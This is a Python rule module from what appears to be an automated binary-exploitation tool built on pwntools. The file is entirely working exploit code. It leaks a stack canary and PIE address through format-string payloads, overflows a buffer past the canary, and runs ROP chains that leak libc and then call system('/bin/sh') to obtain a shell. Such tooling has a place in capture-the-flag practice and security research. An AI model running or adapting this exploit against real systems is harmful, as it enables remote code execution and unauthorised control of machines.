"""Rule: use format string to leak canary/PIE, then overflow in second input."""
from __future__ import annotations

import re
import time

from pwn import log, flat, p64, p32

from autopwn.agent.state import ActionResult, AttemptRecord
from autopwn.agent.action_utils import open_target, verify_shell, interactive_or_close, safe_close


def _condition(state) -> bool:
    return bool(state.discovered_facts.get("fmt_canary_combo"))


def _action(state) -> ActionResult:
    """Stage 1: leak canary+PIE via format string. Stage 2: overflow."""
    ctx = state.ctx
    info = state.discovered_facts["fmt_canary_combo"]
    has_pie = info.get("has_pie", False)
    offset = info.get("overflow_offset", ctx.overflow_offset)

    if offset < 0:
        return ActionResult(success=False, terminal=True,
                            record=AttemptRecord(strategy="fmt_combo", diagnosis="no_offset"))

    # Step 1: Probe format string to find canary and PIE on stack
    canary = 0
    pie_base = 0
    fmt_results = _probe_fmt_leaks(ctx)
    if not fmt_results:
        return ActionResult(success=False, terminal=True,
                            record=AttemptRecord(strategy="fmt_combo", diagnosis="fmt_probe_failed"))

    canary = fmt_results.get("canary", 0)
    pie_leak = fmt_results.get("pie_leak", 0)
    canary_idx = fmt_results.get("canary_idx", 0)
    pie_idx = fmt_results.get("pie_idx", 0)

    if not canary:
        return ActionResult(success=False, terminal=True,
                            record=AttemptRecord(strategy="fmt_combo", diagnosis="no_canary_leaked"))

    log.success(f"Agent fmt_combo: canary={canary:#x}")
    if pie_leak:
        log.success(f"Agent fmt_combo: PIE leak={pie_leak:#x}")

    # Calculate PIE base if needed
    if has_pie and pie_leak:
        pie_base = pie_leak & ~0xfff  # page-align down
        # More precise: subtract known offset (usually a return address)
        ctx.pie_base = pie_base
        log.info(f"Agent fmt_combo: PIE base ~ {pie_base:#x}")

    # Step 2: Build overflow payload with leaked canary
    # Canary position in the overflow: typically at offset - 2*word (before saved rbp + ret)
    word = ctx.bits // 8
    canary_off = ctx.canary_offset if ctx.canary_offset > 0 else (offset - 2 * word)

    # Try to use ret2libc if we can
    success = _try_ret2libc_with_canary(ctx, canary, canary_off, offset, pie_base,
                                         canary_idx, pie_idx)
    if success:
        return ActionResult(
            success=True,
            record=AttemptRecord(strategy="fmt_combo", success=True),
        )

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="fmt_combo", diagnosis="overflow_after_leak_failed"),
    )


def _probe_fmt_leaks(ctx) -> dict:
    """Send format string payloads to discover canary and PIE addresses on stack."""
    results = {}

    # Try %p format to dump stack values
    # We'll use %N$p to read specific positions
    io = None
    try:
        io = open_target(ctx)
        try:
            io.recv(timeout=1)
        except Exception:
            pass

        # Send a bunch of %p's
        # Limit to what the input allows (some binaries have small buffers)
        fmt_payload = b"|".join([f"%{i}$p".encode() for i in range(1, 30)])
        if len(fmt_payload) > 200:
            fmt_payload = b"|".join([f"%{i}$p".encode() for i in range(1, 20)])

        io.send(fmt_payload)
        time.sleep(0.3)

        try:
            output = io.recv(timeout=2)
        except Exception:
            output = b""

        safe_close(io)

        if not output:
            return {}

        text = output.decode("utf-8", errors="replace")
        # Parse hex values from output
        values = []
        for part in re.split(r'[|\s,\n]+', text):
            part = part.strip()
            if part.startswith("0x"):
                try:
                    val = int(part, 16)
                    values.append(val)
                except ValueError:
                    values.append(0)
            elif part == "(nil)":
                values.append(0)

        if not values:
            return {}

        # Find canary: 64-bit canary has 0x00 as low byte, value > 0x1000
        for i, v in enumerate(values):
            if ctx.bits == 64:
                if v > 0x10000 and (v & 0xff) == 0 and v < 0x7fffffffffff:
                    results["canary"] = v
                    results["canary_idx"] = i + 1  # 1-indexed
                    break
            else:
                if v > 0x10000 and (v & 0xff) == 0 and v < 0xffffffff:
                    results["canary"] = v
                    results["canary_idx"] = i + 1
                    break

        # Find PIE leak: 0x55... or 0x56... prefix (64-bit)
        if ctx.pie:
            for i, v in enumerate(values):
                if ctx.bits == 64 and v > 0 and (v >> 40) in (0x55, 0x56):
                    results["pie_leak"] = v
                    results["pie_idx"] = i + 1
                    break

        return results

    except Exception as exc:
        log.debug(f"fmt_probe error: {exc}")
        if io:
            safe_close(io)
        return {}


def _try_ret2libc_with_canary(ctx, canary: int, canary_off: int,
                                overflow_off: int, pie_base: int,
                                canary_idx: int, pie_idx: int) -> bool:
    """Two-input attack: fmt leak then overflow with canary."""
    word = ctx.bits // 8
    pack = p64 if word == 8 else p32

    # Build fmt payload for precise leak (using discovered indices)
    fmt_parts = []
    if canary_idx:
        fmt_parts.append(f"%{canary_idx}$p")
    if pie_idx:
        fmt_parts.append(f"%{pie_idx}$p")
    fmt_payload = b"|".join(p.encode() for p in fmt_parts)

    pop_rdi = ctx.find_gadget("pop rdi")
    ret = ctx.find_gadget("ret")
    if ctx.bits == 64 and not pop_rdi:
        return False

    # Find leak function for ret2libc
    leak_func = None
    leak_plt = 0
    for name in ("puts", "printf"):
        if name in (ctx.plt_table or {}):
            leak_func = name
            leak_plt = ctx.plt_table[name]
            break
    if not leak_func:
        return False

    got_target = ""
    got_addr = 0
    for name in (leak_func, "__libc_start_main", "setvbuf", "read"):
        if name in (ctx.got_table or {}):
            got_target = name
            got_addr = ctx.got_table[name]
            break
    if not got_addr:
        return False

    restart_addr = 0
    if ctx.elf:
        for name in ("main", "_start"):
            if name in ctx.elf.symbols:
                restart_addr = ctx.elf.symbols[name]
                break

    for attempt in range(3):
        io = None
        try:
            io = open_target(ctx)
            try:
                io.recv(timeout=1)
            except Exception:
                pass

            # Stage 1: format string leak
            io.send(fmt_payload)
            time.sleep(0.3)

            try:
                output = io.recv(timeout=2)
            except Exception:
                output = b""

            text = output.decode("utf-8", errors="replace")
            leaked_values = []
            for part in re.split(r'[|\s]+', text):
                part = part.strip()
                if part.startswith("0x"):
                    try:
                        leaked_values.append(int(part, 16))
                    except ValueError:
                        pass

            fresh_canary = canary
            fresh_pie = pie_base
            for v in leaked_values:
                if ctx.bits == 64 and (v & 0xff) == 0 and 0x10000 < v < 0x7fffffffffff:
                    fresh_canary = v
                if ctx.bits == 64 and (v >> 40) in (0x55, 0x56):
                    fresh_pie = v & ~0xfff

            if not fresh_canary:
                safe_close(io)
                continue

            # Stage 2: overflow with canary
            # Payload: padding_to_canary + canary + saved_rbp + ROP_chain
            pad = b"A" * canary_off
            pad += pack(fresh_canary)
            pad += pack(0)  # saved rbp

            if ctx.pie:
                # Need PIE base for addresses
                if not fresh_pie:
                    safe_close(io)
                    continue
                # Adjust addresses relative to PIE base
                # For now, if PIE is on and we don't have a solid base, try direct addresses
                pass

            # ROP: leak libc via puts, then system
            if ctx.bits == 64:
                if ret:
                    chain = [pop_rdi, got_addr, ret, leak_plt, restart_addr]
                else:
                    chain = [pop_rdi, got_addr, leak_plt, restart_addr]
            else:
                chain = [leak_plt, restart_addr, got_addr]

            payload = pad + flat(chain)

            if ctx.input_type in ("gets", "direct"):
                io.sendline(payload)
            else:
                io.send(payload)

            # Parse leak
            leaked_addr = 0
            for _ in range(4):
                try:
                    data = io.recvline(timeout=2).strip(b"\n")
                    if not data:
                        continue
                    data = data.ljust(word, b"\x00")[:word]
                    if word == 8:
                        from pwn import u64
                        addr = u64(data)
                        if 0x7e0000000000 <= addr <= 0x7fffffffffff:
                            leaked_addr = addr
                            break
                    else:
                        from pwn import u32
                        addr = u32(data)
                        if 0xf7000000 <= addr <= 0xf7ffffff:
                            leaked_addr = addr
                            break
                except Exception:
                    break

            if not leaked_addr:
                safe_close(io)
                continue

            log.success(f"Agent fmt_combo: libc leak {got_target} = {leaked_addr:#x}")

            # Resolve libc
            from autopwn.agent.rules.sleep_bypass import _resolve_local_libc
            libc = ctx.libc or _resolve_local_libc(ctx, got_target, leaked_addr)
            if not libc:
                safe_close(io)
                continue

            system_addr = libc.symbols.get("system", 0)
            bin_sh = 0
            try:
                bin_sh = next(libc.search(b"/bin/sh\x00"))
            except StopIteration:
                pass

            if not system_addr or not bin_sh:
                safe_close(io)
                continue

            # Drain restart prompt
            try:
                io.recv(timeout=1.5)
            except Exception:
                pass

            # Re-send fmt leak for fresh canary (ASLR may change)
            io.send(fmt_payload)
            time.sleep(0.3)
            try:
                output2 = io.recv(timeout=2)
            except Exception:
                output2 = b""

            text2 = output2.decode("utf-8", errors="replace")
            for part in re.split(r'[|\s]+', text2):
                part = part.strip()
                if part.startswith("0x"):
                    try:
                        v = int(part, 16)
                        if ctx.bits == 64 and (v & 0xff) == 0 and 0x10000 < v < 0x7fffffffffff:
                            fresh_canary = v
                    except ValueError:
                        pass

            # Stage 3: system("/bin/sh") with fresh canary
            pad2 = b"A" * canary_off
            pad2 += pack(fresh_canary)
            pad2 += pack(0)

            for use_align in ([True, False] if ret else [False]):
                if ctx.bits == 64:
                    if use_align:
                        chain2 = [ret, pop_rdi, bin_sh, system_addr]
                    else:
                        chain2 = [pop_rdi, bin_sh, system_addr]
                else:
                    chain2 = [system_addr, 0xDEADBEEF, bin_sh]

                payload2 = pad2 + flat(chain2)

                try:
                    if ctx.input_type in ("gets", "direct"):
                        io.sendline(payload2)
                    else:
                        io.send(payload2)

                    if verify_shell(io):
                        return interactive_or_close(io, True)
                except Exception:
                    pass

            safe_close(io)

        except Exception as exc:
            log.debug(f"fmt_combo attempt error: {exc}")
            if io:
                safe_close(io)

    return False


RULES = [
    ("fmt_combo", 70, "format string leak canary/PIE then overflow",
     _condition, _action),
]
